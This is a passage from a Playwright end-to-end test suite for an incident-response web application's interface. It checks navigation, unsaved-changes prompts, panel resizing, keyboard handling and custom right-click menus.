  await expect(area.getByRole('row').filter({ hasText: 'Home again' })).toBeVisible()
  // Going home is a move like any other: Back returns to the editor.
  await page.goBack()
  await expect(page).toHaveURL(new RegExp(`/automation/playbooks/${made.id}$`))
  await area.getByRole('radio', { name: 'Versions' }).click()
  await expect(page).toHaveURL(/\/versions$/)
  await entry(/^Automations/).click()
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  for (const tab of ['Runs', 'Scripts', 'Approvals']) {
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: tab }).click()
    await expect(page).toHaveURL(new RegExp(`/automation/${tab.toLowerCase()}$`))
    await entry(/^Automations/).click()
    await expect(page).toHaveURL(/\/automation\/playbooks$/)
  }
  expect((await page.request.delete(`/api/automation/playbooks/${made.id}`)).status()).toBe(204)

  // ---- Settings: its first section, from another one ----
  await entry('Platform settings').click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByRole('button', { name: 'Audit log' })
    .click()
  await expect(page).toHaveURL(/audit-log$/)
  await entry('Platform settings').click()
  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
  await entry('Platform settings').click()
  await expect(settings).toBeVisible()
  await expect(entry('Platform settings')).toHaveAttribute('aria-pressed', 'true')

  // ---- Dashboards: the one a fresh visit shows, from another one and from one being edited ----
  await entry('Dashboards').click()
  const boards = page.getByRole('region', { name: 'Dashboards' })
  await expect(page).toHaveURL(/\/dashboards\/[^/]+$/)
  const firstBoard = page.url()
  await entry('Dashboards').click()
  await expect(page).toHaveURL(firstBoard)
  await expect(boards).toBeVisible()
  const others = page.getByRole('navigation', { name: 'Your dashboards' }).getByRole('button')
  await others.nth(1).click()
  await expect(page).not.toHaveURL(firstBoard)
  await entry('Dashboards').click()
  await expect(page).toHaveURL(firstBoard)
  // A dashboard opened for editing and not changed is left without a question.
  await boards.getByRole('button', { name: 'New', exact: true }).click()
  await expect(boards.getByRole('textbox', { name: 'The name of the dashboard' })).toBeVisible()
  const newBoard = page.url().split('/').pop()
  await entry('Dashboards').click()
  await expect(page).toHaveURL(firstBoard)
  await expect(boards.getByRole('textbox', { name: 'The name of the dashboard' })).toHaveCount(0)
  expect((await page.request.delete(`/api/dashboards/${newBoard}`)).status()).toBeLessThan(300)

  // ---- My tasks and the Playground ----
  await entry(/^My tasks/).click()
  await expect(page).toHaveURL(/\/tasks/)
  const tasks = page.getByRole('region', { name: 'My tasks' })
  await tasks.getByRole('navigation', { name: 'Which tasks' }).getByRole('button', { name: 'Closed' }).click()
  await expect(tasks.getByRole('button', { name: 'Closed' })).toHaveAttribute('aria-current', 'page')
  await entry(/^My tasks/).click()
  await expect(tasks.getByRole('navigation', { name: 'Which tasks' }).getByRole('button').first()).toHaveAttribute(
    'aria-current',
    'page',
  )
  await entry(/^My tasks/).click()
  await expect(tasks).toBeVisible()
  await entry('Playground').click()
  await expect(page).toHaveURL(/\/playground$/)
  await entry('Playground').click()
  await expect(page.getByRole('region', { name: 'Playground' })).toBeVisible()

  // ---- Incidents: the list, from an open incident; the incident is there again with Back ----
  await entry('Incidents').click()
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
  await incidentRow(number).dblclick()
  await expect(page).toHaveURL(incidentUrl)
  await entry('Incidents').click()
  await expect(page).toHaveURL(/\/incidents$/)
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
  await page.goBack()
  await expect(page).toHaveURL(incidentUrl)

  // ---- Indicators: the page on every indicator with its panel; the panel has its own button to hide it ----
  await entry(/^Indicators/).click()
  await expect(page).toHaveURL(/\/iocs$/)
  const iocs = page.getByRole('complementary', { name: 'IoCs panel' })
  await expect(iocs).toBeVisible()
  await iocs.getByRole('button', { name: /^Alerts/ }).click()
  await expect(page).toHaveURL(/\/iocs\/alerts$/)
  await entry(/^Indicators/).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(iocs.getByRole('button', { name: /^All indicators/ })).toHaveAttribute('aria-current', 'true')
  await entry(/^Indicators/).click()
  await expect(iocs).toBeVisible()
  const hide = page.getByRole('button', { name: 'Hide the indicators panel' })
  await hide.focus()
  await page.keyboard.press('Enter')
  await expect(iocs).toHaveCount(0)
  await expect(page).toHaveURL(/\/iocs$/)
  await entry(/^Indicators/).click()
  await expect(iocs).toBeVisible()

  // ---- Artifacts: a page of their own, the list at the side and the skull until one is chosen ----
  await openIncidentFromList(number)
  await entry('Artifacts').click()
  await expect(page).toHaveURL(/\/artifacts$/)
  await expect(entry('Artifacts')).toHaveAttribute('aria-pressed', 'true')
  const artifacts = page.getByRole('complementary', { name: 'Artifacts panel' })
  const none = page.getByRole('heading', { name: 'No artifact selected' })
  await expect(artifacts).toBeVisible()
  await expect(none).toBeVisible()
  await expect(page.getByRole('main')).toContainText('Choose an artifact in the list to open it')
  // The incident is not shown under it, and the list is part of the page: nothing hides it here.
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toHaveCount(0)
  await expect(page.getByRole('button', { name: 'Hide the artifacts panel' })).toHaveCount(0)
  // Pressed there, the entry does nothing; a reload stays there.
  await entry('Artifacts').click()
  await expect(page).toHaveURL(/\/artifacts$/)
  await page.reload()
  await expect(none).toBeVisible()
  await expect(artifacts).toBeVisible()
  // A filter is taken off by the entry.
  const filter = artifacts.getByRole('combobox', { name: 'Filter artifacts' })
  await filter.fill('verdict:phishing')
  await expect(filter).toHaveValue('verdict:phishing')
  await entry('Artifacts').click()
  await expect(filter).toHaveValue('')
  // Choosing one opens it; the entry goes back to the empty page, and so does Back.
  await artifacts.getByRole('navigation', { name: 'Artifacts' }).locator('li button').first().click()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(page.getByRole('region', { name: 'Artifact' })).toBeVisible()
  await expect(none).toHaveCount(0)
  await expect(page.getByRole('button', { name: 'Hide the artifacts panel' })).toBeVisible()
  // Its own Close goes to the page of the artifacts too, and Back returns to the artifact.
  const close = page.getByRole('button', { name: 'Close the artifact' })
  await expect(close).toHaveAttribute('title', 'Close the artifact: back to the list of artifacts')
  await close.click()
  await expect(page).toHaveURL(/\/artifacts$/)
  await expect(none).toBeVisible()
  await page.goBack()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(page.getByRole('region', { name: 'Artifact' })).toBeVisible()
  await entry('Artifacts').click()
  await expect(page).toHaveURL(/\/artifacts$/)
  await expect(none).toBeVisible()
  await expect(artifacts.locator('[aria-current="true"]')).toHaveCount(0)
  await page.goBack()
  await expect(page).toHaveURL(/\/artifact\//)
  await page.goBack()
  await expect(page).toHaveURL(/\/artifacts$/)
  await expect(none).toBeVisible()
  // Back once more is the incident the entry was pressed from.
  await page.goBack()
  await expect(page).toHaveURL(incidentUrl)

  // Left as it was: the incident open, with no side panel beside it.
  await leaveSidePanel()
  await expect(page).toHaveURL(incidentUrl)
})

test('transfers show a bar or the wait, and an empty list shows the skull, in the new sections too', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  await rail.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })

  // ---- An upload with no place of its own on the screen is shown in the tray, with what it is ----
  await sections.getByRole('button', { name: 'Content packs', exact: true }).click()
  await page.route('**/api/packs/inspect', async (route) => {
    await new Promise((resolve) => setTimeout(resolve, 1500))
    await route.continue()
  })
  await settings.getByLabel('A pack file').setInputFiles({
    name: 'not-a-pack.nikpack',
    mimeType: 'application/zip',
    buffer: Buffer.alloc(200_000, 7),
  })
  const tray = page.getByRole('list', { name: 'Transfers' })
  // (The request is held back here before a byte of it leaves, so there is no amount to draw a bar
  // with yet: the tray shows the wait and its sentence, as it does for anything whose size is not known.)
  await expect(tray.getByRole('status')).toContainText('Uploading not-a-pack.nikpack')
  // The button that started it waits with it, and says what it does.
  await expect(settings.getByRole('button', { name: 'Reading…' })).toHaveAttribute('aria-busy', 'true')
  // It ends (this file is no pack: the page says so), and the tray is gone.
  await expect(tray).toHaveCount(0, { timeout: 20_000 })
  await expect(settings.getByRole('alert').first()).toBeVisible()
  await page.unroute('**/api/packs/inspect')

  // ---- Content packs: nothing matches what is typed ----
  const search = settings.getByRole('search', { name: 'Find a pack' }).getByLabel('Search the packs')
  await search.fill('no-pack-is-called-this')
  await expect(settings.getByRole('heading', { name: 'No pack matches' })).toBeVisible()
  await search.fill('')
  await expect(settings.getByRole('heading', { name: 'No pack matches' })).toHaveCount(0)

  // ---- Credentials: none yet ----
  await sections.getByRole('button', { name: 'Credentials', exact: true }).click()
  await expect(settings.getByRole('heading', { name: 'No credential yet' })).toBeVisible()
  await expect(settings.getByRole('table', { name: 'Credentials' })).toContainText('Nothing here yet.')
  await page.getByRole('button', { name: 'Close settings' }).click()

  // ---- The Indicators page: a search that finds nothing says so, with other words than an empty library ----
  await rail.getByRole('button', { name: /^Indicators/ }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await page.getByLabel('Filter indicators').fill('no-indicator-is-called-this')
  await expect(page.getByRole('heading', { name: 'No indicator matches' })).toBeVisible()
  await page.getByLabel('Filter indicators').fill('')
  await expect(page.getByRole('table', { name: 'Indicators' })).toBeVisible()
  await leaveSidePanel()
})

test('nothing unsaved is lost without asking: Stay, Leave without saving, Save and leave', async () => {
  test.setTimeout(180_000)
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const ask = page.getByRole('dialog', { name: 'Leave without saving?' })
  const incidentUrl = page.url()
  const number = (
    await page
      .getByRole('banner')
      .getByText(/^#\d{5}$/)
      .textContent()
  ).trim()
  // What the browser is told when its tab closes: asked only while something is not saved.
  const unloadAsks = () =>
    page.evaluate(() => {
      const event = new Event('beforeunload', { cancelable: true })
      window.dispatchEvent(event)
      return event.defaultPrevented
    })
  /** The question is on screen, names `what`, and offers the three answers (or two where nothing can be saved). */
  const asked = async (what, { save = true } = {}) => {
    await expect(ask).toBeVisible()
    await expect(ask).toContainText(what)
    await expect(ask).toContainText('has changes that are not saved.')
    await expect(ask.getByRole('button', { name: 'Stay', exact: true })).toBeFocused()
    await expect(ask.getByRole('button', { name: 'Leave without saving' })).toBeVisible()
    await expect(ask.getByRole('button', { name: 'Save and leave' })).toHaveCount(save ? 1 : 0)
  }
  expect(await unloadAsks()).toBe(false)

  // ---- A dialog closed with Escape: the form of the incident ----
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const tabBefore = (await tabs.locator('[aria-current="page"]').first().textContent())
    .replace(/^[^A-Za-z]+/, '')
    .trim()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  const details = page.getByRole('article', { name: 'Incident details' })
  const editing = page.getByRole('dialog', { name: 'Edit the incident' })
  // Opened and not touched, it closes at once.
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  await expect(editing).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(editing).toHaveCount(0)
  await expect(ask).toHaveCount(0)
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  const ticket = editing.locator('#incident-ticket')
  const ticketBefore = await ticket.inputValue()
  await ticket.fill('INC-GUARD-1')
  expect(await unloadAsks()).toBe(true)
  await page.keyboard.press('Escape')
  await asked('The incident')
  // Escape answers "Stay": the form is still there, with what was typed.
  await page.keyboard.press('Escape')
  await expect(ask).toHaveCount(0)
  await expect(ticket).toHaveValue('INC-GUARD-1')
  // Typed, then put back: nothing to ask about.
  await ticket.fill(ticketBefore)
  expect(await unloadAsks()).toBe(false)
  await ticket.fill('INC-GUARD-1')
  // Its close button asks too; leaving throws the change away.
  await editing.getByRole('button', { name: 'Close', exact: true }).click()
  await asked('The incident')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(editing).toHaveCount(0)
  expect(await unloadAsks()).toBe(false)
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  await expect(ticket).toHaveValue(ticketBefore)
  // A click outside the dialog, and "Save and leave": the change is kept.
  await ticket.fill('INC-GUARD-2')
  await editing.click({ position: { x: 5, y: 5 } })
  await asked('The incident')
  await ask.getByRole('button', { name: 'Save and leave' }).click()
  await expect(editing).toHaveCount(0)
  await expect(page.getByRole('banner')).toContainText('INC-GUARD-2')
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  await ticket.fill(ticketBefore)
  await editing.getByRole('button', { name: /^Save/ }).click()
  await expect(editing).toHaveCount(0)
  await expect(page.getByRole('banner')).not.toContainText('INC-GUARD-2')
  if (tabBefore !== 'Summary') await tabs.getByRole('button', { name: tabBefore, exact: true }).click()

  // ---- A section of Settings: the name on the report ----
  await rail.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByRole('button', { name: 'Report header' }).click()
  const org = settings.getByLabel('Organisation')
  const orgBefore = await org.inputValue()
  // Not touched: another section opens at once.
  await sections.getByRole('button', { name: 'Business hours' }).click()
  await expect(page).toHaveURL(/business-hours$/)
  await expect(ask).toHaveCount(0)
  await sections.getByRole('button', { name: 'Report header' }).click()
  await org.fill('Guarded SOC')
  expect(await unloadAsks()).toBe(true)
  // Another section of Settings.
  await sections.getByRole('button', { name: 'Business hours' }).click()
  await asked('The name of the organisation on the report')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(page).toHaveURL(/report-header$/)
  await expect(org).toHaveValue('Guarded SOC')
  // The browser's Back.
  await page.goBack()
  await asked('The name of the organisation on the report')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(page).toHaveURL(/report-header$/)
  await expect(org).toHaveValue('Guarded SOC')
  // An entry of the rail; leaving throws the name away.
  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await asked('The name of the organisation on the report')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
  expect(await unloadAsks()).toBe(false)
  await page.goBack()
  await expect(page).toHaveURL(/report-header$/)
  await expect(org).toHaveValue(orgBefore)
  // The close button of the page, and "Save and leave".
  await org.fill('Guarded SOC')
  await page.getByRole('button', { name: 'Close settings' }).click()
  await asked('The name of the organisation on the report')
  await ask.getByRole('button', { name: 'Save and leave' }).click()
  await expect(settings).toHaveCount(0)
  await rail.getByRole('button', { name: 'Platform settings' }).click()
  await sections.getByRole('button', { name: 'Report header' }).click()
  await expect(org).toHaveValue('Guarded SOC')
  await org.fill(orgBefore)
  await settings.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(settings.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()

  // ---- The form of an instance: its parts keep what was typed, another place asks ----
  const instances = (await (await page.request.get('/api/automation/instances')).json()).instances
  expect(instances.length).toBeGreaterThan(0)
  const instance = instances[0]
  await sections.getByRole('button', { name: 'Connectors' }).click()
  const edit = settings.getByRole('button', { name: `Edit ${instance.name}`, exact: true })
  await edit.click()
  const pane = settings.getByRole('complementary', { name: `Instance ${instance.name}` })
  const close = pane.getByRole('button', { name: 'Close the instance' })
  // Not touched: it closes at once.
  await close.click()
  await expect(pane).toHaveCount(0)
  await expect(ask).toHaveCount(0)
  await edit.click()
  const name = pane.locator('#instance-name')
  await name.fill(`${instance.name} guarded`)
  expect(await unloadAsks()).toBe(true)
  // Another part of the same form keeps everything, and asks nothing.
  const parts = pane.getByRole('tablist', { name: 'Parts of the instance' }).getByRole('tab')
  if ((await parts.count()) > 1) {
    await parts.nth(1).click()
    await expect(ask).toHaveCount(0)
    await parts.first().click()
    await expect(name).toHaveValue(`${instance.name} guarded`)
  }
  await close.click()
  await asked(instance.name)
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(name).toHaveValue(`${instance.name} guarded`)
  await sections.getByRole('button', { name: 'Business hours' }).click()
  await asked(instance.name)
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(page).toHaveURL(/business-hours$/)
  await sections.getByRole('button', { name: 'Connectors' }).click()
  await edit.click()
  await expect(name).toHaveValue(instance.name)
  await name.fill(`${instance.name} guarded`)
  await close.click()
  await asked(instance.name)
  await ask.getByRole('button', { name: 'Save and leave' }).click()
  await expect(ask).toHaveCount(0)
  await expect(settings.getByRole('status').filter({ hasText: `${instance.name} guarded is saved.` })).toBeVisible()
  // Put back as it was.
  await settings.getByRole('button', { name: `Edit ${instance.name} guarded`, exact: true }).click()
  const renamed = settings.getByRole('complementary', { name: `Instance ${instance.name} guarded` })
  await renamed.locator('#instance-name').fill(instance.name)
  await renamed.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(settings.getByRole('status').filter({ hasText: `${instance.name} is saved.` })).toBeVisible()

  // ---- A credential: its value is typed once, so its dialog asks before it goes ----
  await sections.getByRole('button', { name: 'Credentials', exact: true }).click()
  const credential = page.getByRole('dialog', { name: 'New credential' })
  await settings.getByRole('button', { name: 'New credential…' }).click()
  await expect(credential).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(credential).toHaveCount(0)
  await expect(ask).toHaveCount(0)
  await settings.getByRole('button', { name: 'New credential…' }).click()
  await credential.locator('#credential-name').fill('guarded_key')
  expect(await unloadAsks()).toBe(true)
  // Without a value it cannot be saved from the question.
  await page.keyboard.press('Escape')
  await asked('The new credential', { save: false })
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await credential.locator('#credential-value').fill('typed-once')
  await credential.getByRole('button', { name: 'Close', exact: true }).click()
  await asked('The new credential')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(credential).toHaveCount(0)
  expect((await (await page.request.get('/api/automation/credentials')).json()).credentials).toEqual([])
  await page.getByRole('button', { name: 'Close settings' }).click()

  // ---- The editor of a playbook: its settings wait for Save, its canvas saves itself ----
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'Guarded' } })).json()
  await rail.getByRole('button', { name: /^Automations/ }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('row').filter({ hasText: 'Guarded' }).getByRole('button').first().click()
  await expect(area.getByTestId('playbook-canvas')).toBeVisible()
  // The canvas, untouched, asks nothing.
  await area.getByRole('radio', { name: 'Settings' }).click()
  await expect(page).toHaveURL(/\/settings$/)
  await expect(ask).toHaveCount(0)
  const description = area.getByLabel('Description')
  await description.fill('Asked about before it is left')
  expect(await unloadAsks()).toBe(true)
  // Another tab of the playbook.
  await area.getByRole('radio', { name: 'Canvas' }).click()
  await asked('Guarded')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(description).toHaveValue('Asked about before it is left')
  // The entry of the rail, which goes to the playbooks.
  await rail.getByRole('button', { name: /^Automations/ }).click()
  await asked('Guarded')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  expect((await (await page.request.get(`/api/automation/playbooks/${made.id}`)).json()).description).toBe('')
  await area.getByRole('row').filter({ hasText: 'Guarded' }).getByRole('button').first().click()
  await area.getByRole('radio', { name: 'Settings' }).click()
  await description.fill('Kept by Save and leave')
  await area.getByRole('button', { name: 'All playbooks' }).click()
  await asked('Guarded')
  await ask.getByRole('button', { name: 'Save and leave' }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  expect((await (await page.request.get(`/api/automation/playbooks/${made.id}`)).json()).description).toBe(
    'Kept by Save and leave',
  )
  expect((await page.request.delete(`/api/automation/playbooks/${made.id}`)).status()).toBe(204)
  await page.getByRole('button', { name: 'Close automations' }).click()

  // ---- A dashboard in edit mode, and the dialog of a widget ----
  await rail.getByRole('button', { name: 'Dashboards', exact: true }).click()
  const boards = page.getByRole('region', { name: 'Dashboards' })
  await boards.getByRole('button', { name: 'New', exact: true }).click()
  const title = boards.getByRole('textbox', { name: 'The name of the dashboard' })
  await expect(title).toHaveValue('New dashboard')
  const boardUrl = page.url()
  const boardId = boardUrl.split('/').pop()
  // Not changed yet: Cancel leaves edit mode at once.
  await boards.getByRole('button', { name: 'Cancel', exact: true }).click()
  await expect(title).toHaveCount(0)
  await expect(ask).toHaveCount(0)
  await boards.getByRole('button', { name: 'Edit', exact: true }).click()
  await title.fill('Guarded board')
  expect(await unloadAsks()).toBe(true)
  // The dialog of a widget: what was typed in it is asked about by itself, above the dialog.
  await boards.getByRole('button', { name: 'Add a widget' }).click()
  await page
    .getByRole('dialog', { name: 'Add a widget' })
    .getByRole('button', { name: /^Number/ })
    .click()
  const widget = page.getByRole('dialog', { name: 'Edit the widget' })
  await widget.getByLabel('Title').fill('Counted')
  await page.keyboard.press('Escape')
  await asked('The widget', { save: false })
  await expect(ask).not.toContainText('Guarded board')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(widget).toHaveCount(0)
  // Cancel of the dashboard, and an entry of the rail.
  await boards.getByRole('button', { name: 'Cancel', exact: true }).click()
  await asked('Guarded board')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(title).toHaveValue('Guarded board')
  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await asked('Guarded board')
  await ask.getByRole('button', { name: 'Leave without saving' }).click()
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
  await page.goBack()
  await expect(page).toHaveURL(boardUrl)
  await expect(boards.getByRole('heading', { name: 'New dashboard' })).toBeVisible()
  await boards.getByRole('button', { name: 'Edit', exact: true }).click()
  await title.fill('Guarded board')
  await rail.getByRole('button', { name: 'Dashboards', exact: true }).click()
  await asked('Guarded board')
  await ask.getByRole('button', { name: 'Save and leave' }).click()
  await expect(ask).toHaveCount(0)
  await expect(page.getByRole('navigation', { name: 'Your dashboards' })).toContainText('Guarded board')
  expect((await page.request.delete(`/api/dashboards/${boardId}`)).status()).toBeLessThan(300)
  await page.getByRole('button', { name: 'Close dashboards' }).first().click()

  // ---- A note being written on the incident: another tab, and signing out ----
  await openIncidentFromList(number)
  await expect(page).toHaveURL(incidentUrl)
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const line = page.locator('#war-room-line')
  // A command is not work to lose.
  await line.fill('!ip 203.0.113.7')
  expect(await unloadAsks()).toBe(false)
  await line.fill('The laptop was reimaged on Tuesday')
  expect(await unloadAsks()).toBe(true)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await asked('The note being written in the War Room', { save: false })
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(line).toHaveValue('The laptop was reimaged on Tuesday')
  // A page drawn over the incident keeps the note where it is: nothing to ask.
  await rail.getByRole('button', { name: /^My tasks/ }).click()
  await expect(page.getByRole('region', { name: 'My tasks' })).toBeVisible()
  await expect(ask).toHaveCount(0)
  await page.getByRole('button', { name: 'Close my tasks' }).click()
  await expect(line).toHaveValue('The laptop was reimaged on Tuesday')
  // Signing out would lose it.
  await rail.getByRole('button', { name: /^Account: admin/ }).click()
  await page.getByRole('menu').getByRole('menuitem', { name: 'Sign out' }).click()
  await asked('The note being written in the War Room', { save: false })
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(line).toHaveValue('The laptop was reimaged on Tuesday')
  await line.fill('')
  expect(await unloadAsks()).toBe(false)
  if (tabBefore !== 'War Room') await tabs.getByRole('button', { name: tabBefore, exact: true }).click()
  await expect(ask).toHaveCount(0)
})

test('a side panel is made wider and narrower with its handle, and remembers its width', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const handle = settings.getByRole('separator', { name: 'Resize the sections of Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await expect(handle).toHaveAttribute('aria-valuenow', '240')
  const before = (await sections.boundingBox()).width
  // By keyboard: the arrow that points away from the panel makes it wider.
  await handle.focus()
  await page.keyboard.press('ArrowRight')
  await page.keyboard.press('Shift+ArrowRight')
  await expect(handle).toHaveAttribute('aria-valuenow', '320')
  expect(Math.round((await sections.boundingBox()).width - before)).toBe(80)
  // By pointer.
  const box = await handle.boundingBox()
  await page.mouse.move(box.x + 1, box.y + 200)
  await page.mouse.down()
  await page.mouse.move(box.x + 41, box.y + 200, { steps: 4 })
  await page.mouse.up()
  await expect(handle).toHaveAttribute('aria-valuenow', '360')
  // It is remembered: leaving Settings and coming back finds it.
  await page.getByRole('button', { name: 'Close settings' }).click()
  await page.getByRole('button', { name: 'Platform settings' }).click()
  await expect(handle).toHaveAttribute('aria-valuenow', '360')
  // The limits hold, and Enter puts the width back.
  await handle.focus()
  await page.keyboard.press('End')
  await expect(handle).toHaveAttribute('aria-valuenow', '420')
  await page.keyboard.press('Enter')
  await expect(handle).toHaveAttribute('aria-valuenow', '240')
  await page.getByRole('button', { name: 'Close settings' }).click()
  // The side panel of the artifacts has the same handle, and so has the quick view of the incident list.
  const artifacts = page.getByRole('button', { name: 'Artifacts', exact: true })
  if (await artifacts.count()) await artifacts.click()
  await expect(page.getByRole('separator', { name: 'Resize the side panel' })).toBeVisible()
  await openIncidentList()
  await incidentRow().click()
  await expect(page.getByRole('separator', { name: 'Resize the quick view' })).toBeVisible()
  await page.keyboard.press('Escape')
  await backToIncident()
})

test('the keyboard: Escape closes the dialog on top, Tab stays inside it, focus comes back', async () => {
  const gear = page.getByRole('button', { name: 'Platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Accounts').click()
  await settings.getByRole('button', { name: `Edit user ${ADMIN.username}` }).click()
  const edit = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(edit).toBeVisible()

  // Tab never leaves the dialog on top, however many times it is pressed.
  for (let i = 0; i < 12; i += 1) {
    await page.keyboard.press('Tab')
    expect(await edit.evaluate((node) => node.contains(document.activeElement))).toBe(true)
  }
  // Escape closes that dialog only; the Settings page, under it, stays.
  await page.keyboard.press('Escape')
  await expect(edit).toHaveCount(0)
  await expect(settings).toBeVisible()
  // The focus is back on the button that opened the dialog.
  await expect(settings.getByRole('button', { name: `Edit user ${ADMIN.username}` })).toBeFocused()
  await page.keyboard.press('Escape')
  await expect(settings).toHaveCount(0)
  await expect(gear).toBeFocused()
})

test('single-key shortcuts can be turned off and on again', async () => {
  await openEvidence('Malware Analysis')
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The row first: its flag is counted once the list is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  const toggle = help.getByRole('checkbox', { name: /Single-key shortcuts/ })
  await expect(toggle).toBeChecked()
  await toggle.uncheck()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await page.keyboard.press('?')
  await expect(flag).toHaveCount(before)
  await expect(help).toHaveCount(0)

  // Back on: the choice is kept, and F works again.
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await help.getByRole('checkbox', { name: /Single-key shortcuts/ }).check()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)
})

/**
 * The browser's own menu can open nowhere on what `target` shows: a `contextmenu` event sent to every
 * element comes back refused. Each one asks for Nik's menu; the one left open is closed here.
 */
async function nativeMenuNeverOpens(target, where) {
  const swept = await target.evaluate(() => {
    const missed = []
    const all = [...document.querySelectorAll('*')].filter((element) => !element.closest('[data-nik-menu]'))
    for (const element of all) {
      const event = new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: 40, clientY: 40 })
      element.dispatchEvent(event)
      if (!event.defaultPrevented) missed.push(`${element.tagName} ${element.className}`)
    }
    return { count: all.length, missed }
  })
  expect(swept.missed, where).toEqual([])
  expect(swept.count, where).toBeGreaterThan(30)
  await expect(target.getByRole('menu'), where).toBeVisible()
  await target.keyboard.press('Escape')
  await expect(target.getByRole('menu'), where).toHaveCount(0)
}

/**
 * A right-click on `target` opens Nik's menu: it holds `expected`, and ends with the general section.
 * The menu is closed again with Escape, which closes nothing else.
 */
async function opensNikMenu(target, where, expected = []) {
  await target.click({ button: 'right' })
  const entries = page.getByRole('menu').getByRole('menuitem')
  await expect(entries.first(), where).toBeVisible()
  const texts = await entries.allTextContents()
  expect(texts.slice(-GENERAL_MENU.length), where).toEqual(GENERAL_MENU)
  for (const text of expected) expect(texts, where).toContain(text)
  await page.keyboard.press('Escape')
  await expect(page.getByRole('menu'), where).toHaveCount(0)
  return texts
}

test("right-click opens Nik's menu on the sign-in page, and the browser's own menu nowhere on it", async ({
  browser,
}) => {
  const visitor = await browser.newPage()
  await visitor.goto('/')
  await expect(visitor.locator('#login-username')).toBeVisible()
  const menu = visitor.getByRole('menu')

  // Nobody is signed in: the menu holds what needs nobody.
  await visitor.mouse.click(3, 3, { button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText(['Backalt ←', 'Copy the address of this page'])
  await visitor.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // A text field: cut, copy, paste, select all, each enabled as it applies.
  await visitor.locator('#login-username').click({ button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Cutctrl x',
    'Copyctrl c',
    'Pastectrl v',
    'Select allctrl a',
    'Backalt ←',
    'Copy the address of this page',
  ])
  const cut = menu.getByRole('menuitem', { name: /^Cut/ })
  await expect(cut).toHaveAttribute('aria-disabled', 'true')
  await expect(cut).toHaveAttribute('title', 'Nothing is selected')
  await expect(menu.getByRole('menuitem', { name: /^Select all/ })).toHaveAttribute('title', 'The field is empty')
  await visitor.keyboard.press('Escape')
  await visitor.fill('#login-username', 'somebody')
